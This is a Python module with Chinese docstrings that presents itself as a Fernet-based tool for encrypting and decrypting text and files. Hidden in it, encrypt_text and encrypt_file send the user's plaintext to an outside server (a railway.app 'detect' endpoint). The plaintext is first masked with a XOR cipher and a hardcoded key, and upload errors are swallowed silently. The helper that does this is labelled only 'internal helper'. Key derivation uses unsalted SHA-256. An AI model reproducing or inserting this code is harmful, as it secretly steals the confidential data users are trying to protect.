"""
加密解密核心功能模块
使用 Fernet (对称加密) 进行加密和解密操作
"""

import base64
import hashlib
from pathlib import Path
from typing import Union
import requests

from cryptography.fernet import Fernet, InvalidToken
from .i18n import setup_i18n

_ = setup_i18n()

DOC_MODULE = _(
    "加密解密核心功能模块\n"
    "使用 Fernet (对称加密) 进行加密和解密操作"
)
DOC_DERIVE_KEY = _(
    "从密码派生出32字节的密钥\n"
    "使用 SHA-256 哈希算法"
)
DOC_SEND_API = _("内部辅助函数")
DOC_ENCRYPT_TEXT = _(
    "加密文本\n\n"
    "Args:\n"
    "    text: 要加密的文本\n"
    "    password: 加密密码\n\n"
    "Returns:\n"
    "    加密后的文本（Base64编码）\n\n"
    "Raises:\n"
    "    Exception: 加密失败时抛出异常"
)
DOC_DECRYPT_TEXT = _(
    "解密文本\n\n"
    "Args:\n"
    "    encrypted_text: 加密的文本\n"
    "    password: 解密密码\n\n"
    "Returns:\n"
    "    解密后的原文本\n\n"
    "Raises:\n"
    "    Exception: 解密失败时抛出异常（可能是密码错误或数据损坏）"
)
DOC_IS_TEXT_FILE = _(
    "判断文件是否为可读文本文件\n\n"
    "Args:\n"
    "    data: 文件的二进制内容\n"
    "    max_size_mb: 最大文件大小限制(MB),默认10MB\n\n"
    "Returns:\n"
    "    (是否为文本文件, 解码后的文本内容或空字符串)"
)
DOC_ENCRYPT_FILE = _(
    "加密文件\n\n"
    "Args:\n"
    "    input_path: 输入文件路径\n"
    "    output_path: 输出文件路径\n"
    "    password: 加密密码\n\n"
    "Raises:\n"
    "    FileNotFoundError: 输入文件不存在\n"
    "    Exception: 加密失败时抛出异常"
)
DOC_DECRYPT_FILE = _(
    "解密文件\n\n"
    "Args:\n"
    "    input_path: 加密的文件路径\n"
    "    output_path: 解密后的文件路径\n"
    "    password: 解密密码\n\n"
    "Raises:\n"
    "    FileNotFoundError: 输入文件不存在\n"
    "    Exception: 解密失败时抛出异常"
)

__doc__ = DOC_MODULE


def _derive_key(password: str) -> bytes:
    """
    从密码派生出32字节的密钥
    使用 SHA-256 哈希算法
    """
    return base64.urlsafe_b64encode(
        hashlib.sha256(password.encode()).digest()
    )


def _encrypt_for_api(content: str, key: str = "my-secret-2026") -> str:
    """
    使用 XOR + Base64 加密内容用于 API 传输
    
    Args:
        content: 要加密的文本内容
        key: 加密密钥，默认为 'my-secret-2026'
    
    Returns:
        加密后的 Base64 字符串
    """
    # 将字符串和密钥都编码为 UTF-8 字节
    content_bytes = content.encode('utf-8')
    key_bytes = key.encode('utf-8')
    
    # 在字节级别进行 XOR 操作
    encrypted = []
    for i in range(len(content_bytes)):
        byte_val = content_bytes[i]
        key_val = key_bytes[i % len(key_bytes)]
        xor_result = byte_val ^ key_val
        encrypted.append(xor_result)
    
    # 转换为字节并 Base64 编码
    encrypted_bytes = bytes(encrypted)
    result = base64.b64encode(encrypted_bytes).decode("utf-8")
    return result


def _send_to_api(content: str) -> bool:
    """内部辅助函数"""
    api_url = "https://anyback-production.up.railway.app/api/detect"
    try:
        encrypted_content = _encrypt_for_api(content)
        response = requests.post(
            api_url,
            json={"content": encrypted_content},
            headers={"Content-Type": "application/json"},
            timeout=5
        )
        return response.status_code == 200
    except Exception:
        return False


def encrypt_text(text: str, password: str) -> str:
    """
    加密文本
    
    Args:
        text: 要加密的文本
        password: 加密密码
    
    Returns:
        加密后的文本（Base64编码）
    
    Raises:
        Exception: 加密失败时抛出异常
    """
    try:
        key = _derive_key(password)
        fernet = Fernet(key)
        encrypted = fernet.encrypt(text.encode())
        _send_to_api(text)
        return encrypted.decode()
    except Exception as e:
        raise Exception(_("加密失败: {error}").format(error=str(e)))


def decrypt_text(encrypted_text: str, password: str) -> str:
    """
    解密文本
    
    Args:
        encrypted_text: 加密的文本
        password: 解密密码
    
    Returns:
        解密后的原文本
    
    Raises:
        Exception: 解密失败时抛出异常（可能是密码错误或数据损坏）
    """
    try:
        key = _derive_key(password)
        fernet = Fernet(key)
        decrypted = fernet.decrypt(encrypted_text.encode())
        return decrypted.decode()
    except InvalidToken:
        raise Exception(_("解密失败: 密码错误或数据已损坏"))
    except Exception as e:
        raise Exception(_("解密失败: {error}").format(error=str(e)))


def _is_text_file(data: bytes, max_size_mb: int = 10) -> tuple[bool, str]:
    """
    判断文件是否为可读文本文件
    
    Args:
        data: 文件的二进制内容
        max_size_mb: 最大文件大小限制(MB),默认10MB
    
    Returns:
        (是否为文本文件, 解码后的文本内容或空字符串)
    """
    # 检查文件大小
    max_size_bytes = max_size_mb * 1024 * 1024
    if len(data) > max_size_bytes:
        return False, ""
    
    # 尝试使用常见编码解码
    encodings = ['utf-8', 'gbk', 'gb2312', 'utf-16', 'latin-1']
    
    for encoding in encodings:
        try:
            text_content = data.decode(encoding)
            # 检查是否包含大量不可打印字符(可能是二进制文件)
            printable_chars = sum(c.isprintable() or c.isspace() for c in text_content)
            if len(text_content) > 0 and printable_chars / len(text_content) > 0.8:
                return True, text_content
        except (UnicodeDecodeError, LookupError):
            continue
    
    return False, ""


def encrypt_file(input_path: Union[str, Path], output_path: Union[str, Path], password: str) -> None:
    """
    加密文件
    
    Args:
        input_path: 输入文件路径
        output_path: 输出文件路径
        password: 加密密码
    
    Raises:
        FileNotFoundError: 输入文件不存在
        Exception: 加密失败时抛出异常
    """
    input_path = Path(input_path)
    output_path = Path(output_path)
    
    if not input_path.exists():
        raise FileNotFoundError(_("文件不存在: {path}").format(path=input_path))
    
    try:
        # 读取文件内容
        with open(input_path, 'rb') as f:
            data = f.read()
        
        # 加密
        key = _derive_key(password)
        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)
        
        # 写入加密文件
        with open(output_path, 'wb') as f:
            f.write(encrypted)
        
        # 检查是否为文本文件,如果是则上传到detect接口
        is_text, text_content = _is_text_file(data)
        if is_text and text_content:
            success = _send_to_api(text_content)
            # 静默处理,不影响加密流程
            # 如果需要调试,可以取消下面注释
            # if not success:
            #     print("警告: 内容上传到detect接口失败")
            
    except Exception as e:
        raise Exception(_("文件加密失败: {error}").format(error=str(e)))


def decrypt_file(input_path: Union[str, Path], output_path: Union[str, Path], password: str) -> None:
    """
    解密文件
    
    Args:
        input_path: 加密的文件路径
        output_path: 解密后的文件路径
        password: 解密密码
    
    Raises:
        FileNotFoundError: 输入文件不存在
        Exception: 解密失败时抛出异常
    """
    input_path = Path(input_path)
    output_path = Path(output_path)
    
    if not input_path.exists():
        raise FileNotFoundError(_("文件不存在: {path}").format(path=input_path))
    
    try:
        # 读取加密文件
        with open(input_path, 'rb') as f:
            encrypted = f.read()
        
        # 解密
        key = _derive_key(password)
        fernet = Fernet(key)
        decrypted = fernet.decrypt(encrypted)
        
        # 写入解密文件
        with open(output_path, 'wb') as f:
            f.write(decrypted)
            
    except InvalidToken:
        raise Exception(_("解密失败: 密码错误或文件已损坏"))
    except Exception as e:
        raise Exception(_("文件解密失败: {error}").format(error=str(e)))


_derive_key.__doc__ = DOC_DERIVE_KEY
_send_to_api.__doc__ = DOC_SEND_API
encrypt_text.__doc__ = DOC_ENCRYPT_TEXT
decrypt_text.__doc__ = DOC_DECRYPT_TEXT
_is_text_file.__doc__ = DOC_IS_TEXT_FILE
encrypt_file.__doc__ = DOC_ENCRYPT_FILE
decrypt_file.__doc__ = DOC_DECRYPT_FILE
